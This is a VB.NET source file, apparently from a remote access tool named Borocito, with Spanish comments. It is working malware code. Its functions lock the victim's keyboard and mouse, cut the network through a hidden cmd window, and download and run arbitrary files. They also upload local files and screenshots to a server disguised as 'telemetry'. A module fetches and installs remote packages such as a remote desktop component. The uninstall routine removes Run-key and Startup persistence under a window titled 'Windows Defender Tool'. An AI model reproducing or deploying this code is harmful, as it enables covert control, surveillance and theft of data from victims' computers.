Imports System.IO
Imports System.Runtime.Serialization.Formatters.Binary
Imports Microsoft.Win32
Imports System.IO.Compression
Module Payloads
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
    Sub Inputs(ByVal Status As Boolean)
        On Error Resume Next
        BlockInput(Status)
        AddToLog("Payloads", "Input locker (Mouse & Keyboard) (" & Status & ")", False)
    End Sub
    Sub DesconectarConexion()
        On Error Resume Next
        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
        Dim ArgumentContent As String = "ipconfig /release"
        p.Arguments = ArgumentContent
        p.CreateNoWindow = True
        p.ErrorDialog = False
        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
        System.Diagnostics.Process.Start(p)
        AddToLog("Payloads", "Internet down!", False)
    End Sub
    Sub SendTheKeys(ByVal proccess As String, ByVal content As String)
        Dim ProcID As Integer
        ProcID = Shell(proccess, AppWinStyle.NormalFocus)
        AppActivate(ProcID)
        For Each singleChar As Char In content
            My.Computer.Keyboard.SendKeys(singleChar, True)
        Next
        AddToLog("Payloads", "A text content was processed and showed", False)
    End Sub
    Sub DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) 'WORKS! Last Check 03/05/2021 11:33PM
        'Uso CMD: /Payloads.DownloadComponent=URL,fileName,True,NULL,null
        'Descripcion
        '   URL = url de descarga directa
        '   fileName = nombre del archivo con su extencion
        '   True/False = si debe ser ejecutado
        '   args = indica argumentos para el inicio (solo en caso de RunIt=True)
        '   (opcional) filePath = indica una ruta para almacenar el archivo
        Try
            If filePath = Nothing Or filePath.ToLower = "null" Then
                filePath = DIRCommons & "\Comps"
            End If
            If Args = Nothing Or Args.ToLower = "null" Then
                Args = Nothing
            End If
            Try
                If My.Computer.FileSystem.DirectoryExists(filePath) = False Then
                    My.Computer.FileSystem.CreateDirectory(filePath)
                End If
            Catch
            End Try
            My.Computer.Network.DownloadFile(URL, filePath & "\" & fileName)
            Threading.Thread.Sleep(50)
            If RunIt = True Then
                Process.Start(filePath & "\" & fileName, Args)
            End If
        Catch
        End Try
    End Sub
    Sub uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing)
        'Uso CMD: /Payloads.uploadAfile=localFilePath,{serverUploadPost/null}
        Try
            If serverUpload = Nothing Or serverUpload.ToLower = "null" Then
                SendCustomTelemetryFile(filePath)
            Else
                SendCustomTelemetryFile(filePath, serverUpload)
            End If
        Catch ex As Exception
            AddToLog("uploadAfile@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub TakeAnScreenshot()
        Dim BF As New BinaryFormatter
        Dim IMAGEN As Bitmap
        Try
            Dim BM As Bitmap
            BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Dim DIBUJO As Graphics
            DIBUJO = Graphics.FromImage(BM)
            DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
            DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
            IMAGEN = New Bitmap(BM)
            Dim DIBUJO2 As Graphics
            DIBUJO2 = Graphics.FromImage(IMAGEN)
            Dim MICURSOR As Cursor = Cursors.Hand
            Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
            MICURSOR.Draw(DIBUJO2, RECTANGULO)
            Dim MS As New MemoryStream
            IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
            IMAGEN = Image.FromStream(MS)
            Dim theFileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Screenshot.jpg"
            IMAGEN.Save(DIRCommons & "\" & theFileName, Imaging.ImageFormat.Jpeg)
            Threading.Thread.Sleep(100)
            Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
        Catch ex As Exception
            AddToLog("TakeAnScreenshot@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub

    Sub Restart()
        Try
            AddToLog("Restart@Payloads", "Restarting....", True)
            Process.Start(DIRCommons & "\Borocito.exe")
            End
        Catch ex As Exception
            AddToLog("Restart@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Uninstall()
        Try
            AddToLog("Uninstall@Payloads", "Uninstalling, goodbye!....", True)
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Uninstall.cmd") = True Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Uninstall.cmd")
            End If
            Dim Reg_BorocitoConfig As String = "reg delete " & """" & "HKEY_CURRENT_USER\SOFTWARE\Borocito" & """" & " /f" 'Borocito configuration
            Dim Reg_StartAsAdmin As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" & """" & " /v " & """" & Application.ExecutablePath & """" & " /f"
            Dim Reg_StartWithWindows As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" & """" & " /v " & """" & "Borocito" & """" & " /f"
            Dim File_StartWithWindows1 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """"
            Dim File_StartWithWindows2 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """"
            Dim File_StartWithWindows3 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """"
            Dim File_UpdaterTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroUpdater.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroUpdater.exe" & """"
            Dim File_ExtractorTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroExtractor.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroExtractor.exe" & """"
            Dim Dir_DIRCommons As String = "rmdir /q /s " & """" & DIRCommons & """"
            Dim FinalContent As String = "@echo off /c " & "title Windows Defender Tool" &
                " & " & Reg_BorocitoConfig &
                " & " & Reg_StartAsAdmin &
                " & " & Reg_StartWithWindows &
                " & " & File_StartWithWindows1 &
                " & " & File_StartWithWindows2 &
                " & " & File_StartWithWindows3 &
                " & " & File_UpdaterTemp &
                " & " & File_ExtractorTemp &
                " & " & Dir_DIRCommons
            Process.Start("cmd.exe", FinalContent)
            End
        Catch ex As Exception
            AddToLog("Uninstall@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Update(Optional ByVal args As String = Nothing)
        Try
            AddToLog("Update@Payloads", "Starting Updater.exe...", True)
            Process.Start(DIRCommons & "\BorocitoUpdater.exe", args)
            End
        Catch ex As Exception
            AddToLog("Update@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
    Sub Extractor()
        Try
            AddToLog("Extractor@Payloads", "Starting Extractor.exe...", True)
            Process.Start(DIRCommons & "\BorocitoExtractor.exe")
            End
        Catch ex As Exception
            AddToLog("Extractor@Payloads", "Error" & ex.Message, True)
        End Try
    End Sub
End Module
Module BOROGET
    Private DIRBoroGetInstallFolder As String = DIRCommons & "\boro-get"
    Private zipPackageFile As String = DIRBoroGetInstallFolder & "\boro-get.zip"

    Function BORO_GET_ADMIN(ByVal command As String) As String
        Try
            'EJEMPLOS
            '   PACKET boro-get RMTDSK|True|-ServerIP=0.0.0.0 -ServerPort=15243
            '   INSTALL boro-get install
            '   UNINSTALL boro-get uninstall
            '   SET boro-get set boro-get|boro-getPath
            Dim boroGETcommand As String = command.Replace("boro-get", Nothing)
            boroGETcommand = boroGETcommand.Trim()
            If boroGETcommand = "install" Then
                Return InstallBOROGET()
            ElseIf boroGETcommand = "uninstall" Then
                Return UninstallBOROGET()
            ElseIf boroGETcommand = "status" Then
                Dim check_boroget As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
                If check_boroget Is Nothing Then
                    Return "No installed"
                Else
                    If check_boroget.GetValue("boro-get") = Nothing Then
                        Return "No installed"
                    Else
                        Return "Installed! (" & check_boroget.GetValue("Name") & " " & check_boroget.GetValue("Version") & ")"
                    End If
                End If
            ElseIf boroGETcommand = "set" Then
                Dim args() As String = boroGETcommand.Split("|")
                Return SetBOROGET(args(1), args(2))
            Else
                'paquete a instalar
                Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
                Process.Start(regKey.GetValue("boro-get"), boroGETcommand)
                Return "Processing Package (" & boroGETcommand & ")"
            End If
        Catch ex As Exception
            AddToLog("BORO_GET_ADMIN@BOROGET", "Error" & ex.Message, True)
            Return "Error parsing 'boro-get' command."
        End Try
    End Function

    Function InstallBOROGET() As String
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
                My.Computer.FileSystem.CreateDirectory(DIRBoroGetInstallFolder)
            End If
            If My.Computer.FileSystem.FileExists(zipPackageFile) Then
                My.Computer.FileSystem.DeleteFile(zipPackageFile)
            End If
            'Descargar desde el servidor
            My.Computer.Network.DownloadFile(GetIniValue("Components", "boro-get", DIRCommons & "\General.ini"), zipPackageFile)
            'Instalar
            ZipFile.ExtractToDirectory(zipPackageFile, DIRBoroGetInstallFolder)
            'Registra
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-get")
                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            End If
            regKey.SetValue("boro-get", DIRBoroGetInstallFolder & "\boro-get.exe")
            regKey.SetValue("Name", GetIniValue("ASSEMBLY", "Name", DIRBoroGetInstallFolder & "\boro-get.txt"))
            regKey.SetValue("Version", GetIniValue("ASSEMBLY", "Version", DIRBoroGetInstallFolder & "\boro-get.txt"))
            regKey.SetValue("RepoListURL", GetIniValue("CONFIG", "RepoList", DIRBoroGetInstallFolder & "\boro-get.txt"))
            Return "boro-get has been installed!"
        Catch ex As Exception
            AddToLog("Install@BOROGET", "Error" & ex.Message, True)
            Return "Error installing boro-get."
        End Try
    End Function
    Function UninstallBOROGET() As String
        Try
            'Eliminar
            If My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
                My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
            End If
            'Finalizar
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            regKey.SetValue("boro-get", "")
            regKey.SetValue("Name", "")
            regKey.SetValue("Version", "")
            regKey.SetValue("RepoListURL", "")
            Return "boro-get has been uninstalled!"
        Catch ex As Exception
            AddToLog("Uninstall@BOROGET", "Error" & ex.Message, True)
            Return "Error uninstalling boro-get."
        End Try
    End Function
    Function SetBOROGET(ByVal regKey As String, ByVal regValue As String) As String
        Try
            Dim RegeditBoroGet As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            If RegeditBoroGet Is Nothing Then
                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-get")
                RegeditBoroGet = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            End If
            RegeditBoroGet.SetValue(regKey, regValue)
            Return "Key: " & regKey & " Value: " & regValue & " has been setted!"
        Catch ex As Exception
            AddToLog("Set@BOROGET", "Error" & ex.Message, True)
            Return "Error setting registry."
        End Try
    End Function
End Module